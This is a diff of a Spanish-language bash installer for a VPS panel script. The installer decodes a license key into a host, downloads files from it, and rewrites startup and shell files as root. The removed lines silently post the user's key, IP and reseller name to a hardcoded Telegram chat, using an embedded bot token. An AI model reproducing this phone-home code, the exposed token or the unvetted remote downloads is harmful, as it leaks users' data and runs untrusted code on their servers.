@@ -1,6 +1,10 @@
-## ACTUALIZACIÓN 20/02/2025
-# SCRIPT PERU : ∞ META
 #!/bin/bash
+# SCRIPT MODD POR: ILUMINADO
+
+apt-get install figlet
+apt-get install lolcat
+apt-get install neofetch &>/dev/null
+apt-get install boxes -y &>/dev/null
 
 clear
 cd $HOME
@@ -10,11 +14,6 @@ SCPidioma="${SCPdir}/idioma"
 SCPusr="${SCPdir}/ger-user"
 SCPfrm="/etc/ger-frm"
 SCPinst="/etc/ger-inst"
-
-apt-get install figlet -y &>/dev/null
-apt-get install lolcat -y &>/dev/null
-apt-get install neofetch &>/dev/null
-apt-get install boxes -y &>/dev/null
 
 service apache2 restart > /dev/null 2>&1
 apt-get install boxes -y &>/dev/null
@@ -48,11 +47,10 @@ AZUL='\e[34m' && MAGENTA='\e[35m' && MAG='\033[1;36m' &&NEGRITO='\e[1m' && SEMCO
  esac
 }
 
-### PAQUETES PRINCIPALES 
 dependencias() {
   dpkg --configure -a >/dev/null 2>&1
   apt -f install -y >/dev/null 2>&1
-  soft="sudo bsdmainutils zip unzip ufw curl grep python python3 python3-pip screen openssl cron iptables lsof pv boxes cowsay at mlocate gawk bc jq curl npm nodejs socat netcat netcat-traditional net-tools cowsay figlet lolcat build-essential vnstat less "
+  soft="sudo bsdmainutils zip unzip ufw curl grep python python3 python3-pip screen openssl cron iptables lsof pv boxes cowsay at mlocate gawk bc jq curl npm nodejs socat netcat netcat-traditional net-tools cowsay figlet lolcat build-essential netstat vnstat less "
   for i in $soft; do
     paquete="$i"
     [[ $(dpkg --get-selections|grep -w "$i"|head -1) ]] || apt-get install $i -y &>/dev/null
@@ -89,7 +87,6 @@ echo -e "\033[97m       $ESTATUS................. Iptables "
 echo -e "\033[97m       $ESTATUS................. apache2 "
 msg -bar2
 echo -e "\033[1;39m Presiona Enter Para continuar" && read enter
-
 
 ### FIXEADOR PARA SISTEMAS 86_64
 idfix64_86 () {
@@ -136,7 +133,6 @@ MIP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1
 MIP2=$(wget -qO- ifconfig.me)
 [[ "$MIP" != "$MIP2" ]] && IP="$MIP2" || IP="$MIP"
 }  
-
 function_verify () {
   ### INTALAR VERCION DE SCRIPT
   v1=$(curl -sSL "https://raw.githubusercontent.com/GM-VIP/SCRIPT/main/VerScrpt/VercOld")
@@ -146,8 +142,8 @@ function_verify () {
 
 funcao_idioma () {
 msg -bar2
-figlet " -VPS PERU-" | lolcat 
-echo -e "     >>ESTE SCRIPT SE OPTIMIZO A IDIOMA ESPAÑOL<<"
+figlet "    -VPS PERU-" | lolcat 
+echo -e " >>>ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL<<<"
 msg -bar2
 pv="$(echo es)"
 [[ ${#id} -gt 2 ]] && id="es" || id="$pv"
@@ -159,20 +155,20 @@ tput clear
 unset Key > /dev/null 2>&1
 unset Key
 msg -bar2
-figlet " -VPS PERU-" | lolcat 
-echo -e "     >>ESTE SCRIPT SE OPTIMIZO A IDIOMA ESPAÑOL<<" | lolcat
+figlet "    -VPS PERU-" | lolcat 
+echo -e " >>>ESTE SCRIPT ESTA OPTIMIZADO A IDIOMA ESPAÑOL<<<" | lolcat
 msg -bar2
 pv="$(echo es)"
 [[ ${#id} -gt 2 ]] && id="es" || id="$pv"
 byinst="true"
 while [[ ! $Key ]]; do
-msg -bar2 && msg -ne "\033[1;96m            >>> INTRODUZCA LA KEY ABAJO <<<\n   \033[1;31m" && read Key
-        tput cuu1 && tput dl1
+msg -bar2 && msg -ne "=> INSERTA TU KEY #: " && read Key
+tput cuu1 && tput dl1
 done
-msg -ne " # Verificando Key # : "
+msg -ne "# Verificando Key # : "
 cd $HOME
-wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m Code Correcto de KEY" || {
-   echo -e "\033[0;31m Code Incorrecto de KEY"
+wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m ✅KEY CORRECTAMENTE VERIFICADO..." || {
+   echo -e "\033[0;31m ⚠️KEY INCORRECTO..."
    invalid_key
   }
 IP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}') && echo "$IP" > /usr/bin/vendor_code
@@ -181,11 +177,11 @@ function_verify
 updatedb
 if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "KEY INVALIDA!") ]]; then
    msg -bar2
-   msg -ama "$(source trans -b es:${id} " ✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
+   msg -ama "$(source trans -b es:${id} "✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
    REQUEST=$(ofus "$Key"|cut -d'/' -f2)
    [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
    pontos="."
-   stopping="$(source trans -b es:${id} "Verificando Actualizaciónes"|sed -e 's/[^a-z -]//ig')"
+   stopping="$(source trans -b es:${id} "Verificando Actualizaciones"|sed -e 's/[^a-z -]//ig')"
    for arqx in $(cat $HOME/lista-arq); do
    msg -verm "${stopping}${pontos}"
    wget -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
@@ -199,8 +195,8 @@ if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "KEY INVALIDA!") 
    echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2
    mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
    echo "${SCPdir}/menu" > /usr/bin/menu && chmod +x /usr/bin/menu
-   echo "${SCPdir}/menu" > /usr/bin/VIP && chmod +x /usr/bin/VIP
-   echo "menu" > /bin/h && chmod +x /bin/h
+   echo "${SCPdir}/menu" > /usr/bin/adm && chmod +x /usr/bin/adm
+   echo "sudo menu" > /bin/h && chmod +x /bin/h
    echo "$Key" > ${SCPdir}/key.txt
    [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}   
    [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma}
@@ -229,18 +225,6 @@ wget -O /bin/resetsshdrop https://raw.githubusercontent.com/GM-VIP/SCRIPT/main/A
 chmod +x /bin/resetsshdrop
 wget -O /etc/versin_script_new https://raw.githubusercontent.com/GM-VIP/SCRIPT/main/VerScrpt/VercUp &>/dev/null
 msg -bar2
-clear; clear
-echo
-msg -bar
-echo -e "\e[1;92m  Digita Reseller Autorizado Para La Instalacion!!!\e[0m"
-read -p "   RESELLER: " Ghost
-echo "$Ghost" > /etc/newadm/message.txt
-msg -bar
-echo
-echo -e "\e[1;97m       RESELLER AUTORIZADO:    \e[0m"$Ghost
-echo "       ▪︎CREDITO AGREDADO CON EXITO !!!"
-msg -bar
-sleep 2
 echo '#!/bin/sh -e' > /etc/rc.local
 sudo chmod +x /etc/rc.local
 echo "sudo rebootnb" >> /etc/rc.local
@@ -249,10 +233,6 @@ echo "sleep 2s" >> /etc/rc.local
 echo "exit 0" >> /etc/rc.local
 /bin/cp /etc/skel/.bashrc ~/
 echo 'clear' >> .bashrc
-echo 'DATE=$(date +"%d-%m-%y")' >> .bashrc
-echo 'TIME=$(date +"%T")' >> .bashrc
-sleep 1
-clear
 echo 'echo ""' >> .bashrc
 echo 'echo -e "\033[0;31m        __     ______  ____       ____  _____ _____  _   _          " '>> .bashrc
 echo 'echo -e "\033[0;31m        \ \   / /  _ \/ ___|     |  _ \| ____|  _  \| | | |         " '>> .bashrc
@@ -268,12 +248,11 @@ echo 'echo -e "\033[0;33m 🔺Key free no tiene soporte alguno. "'>> .bashrc
 echo 'echo -e "\033[1;35m    "'>> .bashrc
 echo 'echo -e "\033[0;36m  ✅RESELLER : $mess1 "'>> .bashrc
 echo 'echo "" '>> .bashrc
-echo 'echo -e "\033[0;36m  ✅PARA MOSTRAR EL PANEL DE CONTROL ESCRIBA:  \033[0;37m\033[41m menu \033[0m"'>> .bashrc
+echo 'echo -e "\033[0;36m  ✅PARA MOSTRAR EL PANEL DE CONTROL ESCRIBA:  \033[0;37m\033[41m menu \033[0;31m"'>> .bashrc
 echo 'wget -O /etc/versin_script_new https://raw.githubusercontent.com/GM-VIP/SCRIPT/main/VerScrpt/VercUp &>/dev/null'>> .bashrc
 echo 'echo "" '>> .bashrc
-echo
 echo -e "   ESCRIBE menu PARA ACCEDER AL PANEL DE CONTROL: "
-echo -e "\033[0;37m                   \033[1;41m menu \033[0m" && msg -bar2
+echo -e "\033[0;37m                      \033[1;41m menu \033[0;37m" && msg -bar2
 sleep 1
 exit
 }
@@ -308,7 +287,7 @@ verificar_arq () {
 [[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
 [[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}
 case $1 in
-"menu"|"message.txt"|"menu.enc")ARQ="${SCPdir}/";;#MENU
+"menu"|"message.txt"|"menu.enc")ARQ="${SCPdir}/";; #Menu
 "usercodes")ARQ="${SCPusr}/";; #Panel SSRR
 "C-SSR.sh")ARQ="${SCPinst}/";; #Instalacao
 "openssh.sh")ARQ="${SCPinst}/";; #Instalacao
@@ -381,11 +360,11 @@ rm -rf lista-arq
 echo -e " "
 echo -e "  \033[1;44m Deseas Reintentar Colocar La Key O Probar Nueva Key? : \033[0m"
 echo -ne "\033[0;32m " 
-read -p "    Responde [ s | n ] : " -e -i "s" x
+read -p "    Responde [ s | n ] : " -e -i "n" x
 [[ $x = @(s|S|y|Y) ]] && int_fun || exit
 }
 invalid_key () {
-msg -bar2 && msg -verm "Code Invalido -- #¡Key Invalida!# " && msg -bar2
+msg -bar2 && msg -verm "#¡Key Invalida#! " && msg -bar2
 echo -e " ERROR DE LA KEY O FUE UTILIZADA\n RECIENTEMENTE, O KEYGEN HA COLAPZADO " | boxes -d parchment
 [[ -e $HOME/lista-arq ]] && rm $HOME/lista-arq
 echo -e " "
@@ -395,13 +374,13 @@ read -p "    Responde [ s | n ] : " -e -i "s" x
 [[ $x = @(s|S|y|Y) ]] && int_fun || exit
 }
 while [[ ! $Key ]]; do
-msg -bar2 && msg -ne "\033[1;96m            >>> INTRODUZCA LA KEY ABAJO <<<\n   \033[1;31m" && read Key
-        tput cuu1 && tput dl1
+msg -bar2 && msg -ne "=> INSERTA TU KEY #: " && read Key
+tput cuu1 && tput dl1
 done
 msg -ne "# Verificando Key # : "
 cd $HOME
-wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m Code Correcto de KEY" || {
-   echo -e "\033[0;31m Code Incorrecto de KEY"
+wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[0;32m ✅KEY CORRECTAMENTE VERIFICADO..." || {
+   echo -e "\033[0;31m ⚠️KEY INCORRECTO..."
    invalid_key
   }
    
@@ -411,43 +390,26 @@ function_verify
 updatedb
 if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "KEY INVALIDA!") ]]; then
    msg -bar2
-   msg -ama "$(source trans -b es:${id} " ✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
+   msg -ama "$(source trans -b es:${id} "✅VERIFICADO CORRECTAMENTE..."|sed -e 's/[^a-z -]//ig'): \033[1;31m[OWNER : GHOST]"
    REQUEST=$(ofus "$Key"|cut -d'/' -f2)
    [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
    pontos="."
-   stopping="$(source trans -b es:${id} "Verificando Actualizaciónes"|sed -e 's/[^a-z -]//ig')"
+   stopping="$(source trans -b es:${id} "Verificando Actualizaciones"|sed -e 's/[^a-z -]//ig')"
    for arqx in $(cat $HOME/lista-arq); do
    msg -verm "${stopping}${pontos}"
    wget -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
    tput cuu1 && tput dl1
    pontos+="."
    done
-   
-   wget -qO- ifconfig.me > /etc/newadm/IP.log
-   userid="${SCPdir}/ID" 
-   TOKEN="5076200777:AAG2bHA_ux_4oLjLp_r-Ndd87jOttMcuw4I" 
-   URL="https://api.telegram.org/bot$TOKEN/sendMessage" 
-   MSG=" ㅤㅤ  ❗️ KEY ACTIVADA y REGISTRADA ❗️
-ㅤㅤ
-   🆔 ID: ${SCPdir}/ID
-   👤 Reseller: $(cat ${SCPdir}/message.txt)
-   🌐 IP: $(cat ${SCPdir}/IP.log)
-   🔑 KEY: $Key
-   
-   ⚙️ SCRIPT: ♾️ Meta
-   " 
-   activ=$(cat ${userid}) 
-   curl -s --max-time 10 -d "chat_id=$activ&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 
-   curl -s --max-time 10 -d "chat_id=1111342634&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null 
-   rm ${SCPdir}/IDT.log &>/dev/null
+   sleep 1s
    msg -bar2
    listaarqs="$(locate "lista-arq"|head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs   
    cat /etc/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /etc/bash.bashrc.2
    echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2
    mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
    echo "${SCPdir}/menu" > /usr/bin/menu && chmod +x /usr/bin/menu
-   echo "${SCPdir}/menu" > /usr/bin/VIP && chmod +x /usr/bin/VIP
-   echo "menu" > /bin/h && chmod +x /bin/h
+   echo "${SCPdir}/menu" > /usr/bin/adm && chmod +x /usr/bin/adm
+   echo "sudo menu" > /bin/h && chmod +x /bin/h
    echo "$Key" > ${SCPdir}/key.txt
    [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}   
    [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma}
